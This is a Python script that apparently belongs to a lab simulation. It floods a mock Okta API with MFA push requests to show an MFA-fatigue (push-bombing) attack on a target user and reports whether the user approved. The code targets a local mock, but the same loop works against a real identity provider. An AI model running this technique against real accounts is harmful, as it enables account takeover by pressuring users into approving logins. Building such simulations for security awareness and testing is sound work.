#  simulator.py
#  MFA fatigue attacker script.
#  Run this AFTER mock_okta_api.py is running.

import requests
import time
from datetime import datetime

# Pull in our settings
from config import (
    TARGET_URL,
    TARGET_USER,
    BURST_SIZE,
    INTERVAL_SECONDS,
    LOG_FILE
)

def send_push(attempt_number: int) -> dict:
    """
    Send one push notification request to the mock Okta API.
    Returns the API's response as a dict.
    """
    payload = {"user_id": TARGET_USER}

    try:
        response = requests.post(TARGET_URL, json=payload, timeout=5)
        return response.json()

    except requests.exceptions.ConnectionError:
        print("\n[!] ERROR: Could not connect to the mock Okta API.")
        print("[!] Make sure mock_okta_api.py is running in another terminal.")
        print("[!] Run:  python mock_okta_api.py\n")
        exit(1)

    except requests.exceptions.Timeout:
        print(f"[!] Push #{attempt_number} timed out. Skipping.")
        return {"approved": False, "attempt_number": attempt_number}


def run_simulation():
    print("=" * 55)
    print("  MFA FATIGUE SIMULATOR")
    print("=" * 55)
    print(f"  Target user  : {TARGET_USER}")
    print(f"  Burst size   : {BURST_SIZE} pushes")
    print(f"  Interval     : {INTERVAL_SECONDS}s between each push")
    print(f"  API endpoint : {TARGET_URL}")
    print("=" * 55)
    print()

    attack_succeeded = False

    for i in range(1, BURST_SIZE + 1):
        timestamp = datetime.utcnow().isoformat() + "Z"
        print(f"  [{timestamp}] Sending push #{i}...", end=" ")

        result = send_push(i)
        approved = result.get("approved", False)

        if approved:
            print(f"✅ APPROVED on attempt #{i}!")
            attack_succeeded = True
            break
        else:
            print(f"❌ denied")

        # Wait before next push (skip wait after the last one)
        if i < BURST_SIZE:
            time.sleep(INTERVAL_SECONDS)

    print()
    print("=" * 55)
    if attack_succeeded:
        print(f"  [RESULT] Attack SUCCEEDED — victim approved push.")
        print(f"  [RESULT] Credentials are now compromised.")
    else:
        print(f"  [RESULT] Attack FAILED — victim did not approve")
        print(f"           after {BURST_SIZE} attempts.")
    print(f"  [LOG]    Saved to {LOG_FILE}")
    print("=" * 55)


if __name__ == "__main__":
    run_simulation()